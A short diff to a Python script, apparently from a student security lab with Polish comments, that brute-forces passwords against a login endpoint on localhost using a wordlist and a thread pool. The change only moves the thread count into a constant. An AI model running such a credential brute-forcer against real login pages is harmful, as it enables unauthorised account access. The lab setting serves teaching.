@@ -9,6 +9,7 @@ import tqdm
 from itertools import islice
 
 SLICE_SIZE = 1000
+WORKERS=20
 
 URL = "http://localhost:3000/rest/user/login" #adres URL strony
 WORDLIST_FILE = "lab 12/directory-list-2.3-medium.txt" #ścieżka do słownika haseł
@@ -48,7 +49,7 @@ if __name__ == "__main__":
     try:
         with open(WORDLIST_FILE, 'r') as wordlist:
             #otwieramy pulę wątków, max_workers=20 oznacza że jednocześnie będzie sprawdzanych 20 haseł
-            with ThreadPoolExecutor(max_workers=20) as executor:
+            with ThreadPoolExecutor(max_workers=WORKERS) as executor:
                 
                 #tworzymy własny pasek postępu, total to liczba haseł w słowniku, desc to opis paska, unit to jednostka
                 progress = tqdm.tqdm(total=sum(1 for _ in wordlist), desc="Brute forcing hasła", unit="hasło")
